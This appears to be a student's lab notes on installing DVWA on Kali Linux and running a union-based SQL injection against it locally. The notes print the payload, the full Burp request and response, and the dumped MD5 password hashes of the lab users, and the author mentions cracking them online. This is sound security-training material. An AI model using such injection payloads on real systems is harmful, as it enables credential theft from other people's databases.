
I went to this website: https://github.com/digininja/DVWA

Watch below video:
https://www.youtube.com/watch?v=WkyDxNJkgQ4

DVWA db_database 'dvwa', db_user 'dvwa', and db_password 'p@ssw0rd' with a 0. db_port is 3306. db_server is 127.0.0.1

```
─(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ git clone https://github.com/digininja/DVWA.git
Cloning into 'DVWA'...
remote: Enumerating objects: 5703, done.
remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 5703 (delta 25), reused 18 (delta 18), pack-reused 5671 (from 3)
Receiving objects: 100% (5703/5703), 2.74 MiB | 9.94 MiB/s, done.
Resolving deltas: 100% (2836/2836), done.
                                                                             
┌──(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ LS                                 
LS: command not found
                                                                             
┌──(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ ls
DVWA
                                                                             
┌──(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ sudo mv DVWA /var/www/html         
mv: cannot overwrite '/var/www/html/DVWA': Directory not empty
                                                                             
┌──(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ sudo rm -rf /var/www/html/DVWA
                                                                             
┌──(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ sudo mv DVWA /var/www/html    
                                                                             
┌──(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ ls
                                                                             
┌──(kali㉿kali)-[~/projects/dvwa-web-security-lab]
└─$ cd /var/www/html 
                                                                             
┌──(kali㉿kali)-[/var/www/html]
└─$ ls
DVWA  index.html  index.nginx-debian.html
                                                                             
┌──(kali㉿kali)-[/var/www/html]
└─$ sudo service apache2 start         
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html]
└─$ cd DVWA         
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ ls
about.php     database    favicon.ico       logout.php    README.fa.md  README.md     README.uk.md  security.php
CHANGELOG.md  Dockerfile  hackable          phpinfo.php   README.fr.md  README.pl.md  README.vi.md  security.txt
compose.yml   docs        index.php         php.ini       README.id.md  README.pt.md  README.zh.md  setup.php
config        dvwa        instructions.php  README.ar.md  README.it.md  README.ru.md  robots.txt    tests
COPYING.txt   external    login.php         README.es.md  README.ko.md  README.tr.md  SECURITY.md   vulnerabilities
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ ls config
config.inc.php.dist
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$             
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ cp config/config.inc.php.dist config/config.inc.php                              
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ vim config/config.inc.php                     
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ service mariadb start     
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]

```

```
(kali㉿kali)-[/var/www/html/DVWA]
└─$ sudo su-                    
[sudo] password for kali: 
sudo: su-: command not found
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ sudo su -
┌──(root㉿kali)-[~]
└─# mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 11.8.3-MariaDB-1+b1 from Debian -- Please help get to 10k stars at https://github.com/MariaDB/Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> create database dvwa;
Query OK, 1 row affected (0.004 sec)

MariaDB [(none)]> create user dvwa@localhost identified by 'p@ssw0rd';
Query OK, 0 rows affected (0.013 sec)

MariaDB [(none)]> grant all on dvwa.* to dvwa@localhost;
Query OK, 0 rows affected (0.004 sec)

MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0.002 sec)

MariaDB [(none)]> create database dvwa;


```


```
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ mysql -u dvwa -p 
Enter password: 
ERROR 1045 (28000): Access denied for user 'dvwa'@'localhost' (using password: YES)
                                                                                                                    
┌──(kali㉿kali)-[/var/www/html/DVWA]
└─$ mysql -u dvwa -pp@ssw0rd   
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 33
Server version: 11.8.3-MariaDB-1+b1 from Debian -- Please help get to 10k stars at https://github.com/MariaDB/Server

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> use dwva
ERROR 1044 (42000): Access denied for user 'dvwa'@'localhost' to database 'dwva'
MariaDB [(none)]> use dwva;
ERROR 1044 (42000): Access denied for user 'dvwa'@'localhost' to database 'dwva'
MariaDB [(none)]> use dvwa;
Database changed
MariaDB [dvwa]> 


```

Default Credentials of http://localhost/DVWA/login.php is :
Username: admin
Password: password


http://localhost/DVWA/vulnerabilities/sqli/ - gets you to the page to test vulnerabilities.

![[Pasted image 20260418142010.png]]

Launched a temporary project since you can only do a persistent project using BurpSuite Pro.

![[Pasted image 20260418144905.png]]

Used payload 1 UNION SELECT user, password FROM users #

```
POST /DVWA/vulnerabilities/sqli/ HTTP/1.1
Host: localhost
Content-Length: 75
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="99", "Chromium";v="142"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/DVWA/vulnerabilities/sqli/
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=f369c256430fd2ad8f1c6e8536a848a8; security=medium
Connection: keep-alive

id=1%20UNION%20SELECT%20user,%20password%20FROM%20users%20%23&Submit=Submit
```

```
HTTP/1.1 200 OK
Date: Sat, 18 Apr 2026 18:47:24 GMT
Server: Apache/2.4.65 (Debian)
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 5467
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html;charset=utf-8

<!DOCTYPE html>

<html lang="en-GB">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>

		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />

		<link rel="icon" type="\image/ico" href="../../favicon.ico" />

		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>

	</head>

	<body class="home light">
		<div id="container">

			<div id="header">

				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
                </a>
			</div>

			<div id="main_menu">

				<div id="main_menu_padded">
				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
<li class=""><a href="../../instructions.php">Instructions</a></li>
<li class=""><a href="../../setup.php">Setup / Reset DB</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../vulnerabilities/brute/">Brute Force</a></li>
<li class=""><a href="../../vulnerabilities/exec/">Command Injection</a></li>
<li class=""><a href="../../vulnerabilities/csrf/">CSRF</a></li>
<li class=""><a href="../../vulnerabilities/fi/.?page=include.php">File Inclusion</a></li>
<li class=""><a href="../../vulnerabilities/upload/">File Upload</a></li>
<li class=""><a href="../../vulnerabilities/captcha/">Insecure CAPTCHA</a></li>
<li class="selected"><a href="../../vulnerabilities/sqli/">SQL Injection</a></li>
<li class=""><a href="../../vulnerabilities/sqli_blind/">SQL Injection (Blind)</a></li>
<li class=""><a href="../../vulnerabilities/weak_id/">Weak Session IDs</a></li>
<li class=""><a href="../../vulnerabilities/xss_d/">XSS (DOM)</a></li>
<li class=""><a href="../../vulnerabilities/xss_r/">XSS (Reflected)</a></li>
<li class=""><a href="../../vulnerabilities/xss_s/">XSS (Stored)</a></li>
<li class=""><a href="../../vulnerabilities/csp/">CSP Bypass</a></li>
<li class=""><a href="../../vulnerabilities/javascript/">JavaScript Attacks</a></li>
<li class=""><a href="../../vulnerabilities/authbypass/">Authorisation Bypass</a></li>
<li class=""><a href="../../vulnerabilities/open_redirect/">Open HTTP Redirect</a></li>
<li class=""><a href="../../vulnerabilities/cryptography/">Cryptography</a></li>
<li class=""><a href="../../vulnerabilities/api/">API</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../security.php">DVWA Security</a></li>
<li class=""><a href="../../phpinfo.php">PHP Info</a></li>
<li class=""><a href="../../about.php">About</a></li>
</ul><ul class="menuBlocks"><li class=""><a href="../../logout.php">Logout</a></li>
</ul>
				</div>

			</div>

			<div id="main_body">

				
<div class="body_padded">
	<h1>Vulnerability: SQL Injection</h1>

	<div class="vulnerable_code_area">
		<form action="#" method="POST">
			<p>
				User ID:
				<select name="id"><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option></select>
				<input type="submit" name="Submit" value="Submit">
			</p>

		</form>
		<pre>ID: 1 UNION SELECT user, password FROM users #<br />First name: admin<br />Surname: admin</pre><pre>ID: 1 UNION SELECT user, password FROM users #<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre><pre>ID: 1 UNION SELECT user, password FROM users #<br />First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03</pre><pre>ID: 1 UNION SELECT user, password FROM users #<br />First name: 1337<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre><pre>ID: 1 UNION SELECT user, password FROM users #<br />First name: pablo<br />Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre><pre>ID: 1 UNION SELECT user, password FROM users #<br />First name: smithy<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
	</div>

	<h2>More Information</h2>
	<ul>
		<li><a href="https://en.wikipedia.org/wiki/SQL_injection" target="_blank">https://en.wikipedia.org/wiki/SQL_injection</a></li>
		<li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></li>
		<li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">https://owasp.org/www-community/attacks/SQL_Injection</a></li>
		<li><a href="https://bobby-tables.com/" target="_blank">https://bobby-tables.com/</a></li>
	</ul>
</div>

				<br /><br />
				

			</div>

			<div class="clear">
			</div>

			<div id="system_info">
				<input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=sqli&security=medium&locale=en' )"> <input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=sqli&security=medium' )"> <div align="left"><em>Username:</em> admin<br /><em>Security Level:</em> <em>Security Level:</em> medium<br /><em>Locale:</em> en<br /><em>SQLi DB:</em> mysql</div>
			</div>

			<div id="footer">

				<p>Damn Vulnerable Web Application (DVWA)</p>
				<script src='../../dvwa/js/add_event_listeners.js'></script>

			</div>

		</div>

	</body>

</html>
```

Here are the hashes of the passwords of ALL the users.

![[Pasted image 20260418151110.png]]

I used a online website to crack the hashes:
![[Pasted image 20260418151817.png]]

So an SQL injection that can find the passwords of other users as well, not just your own user.

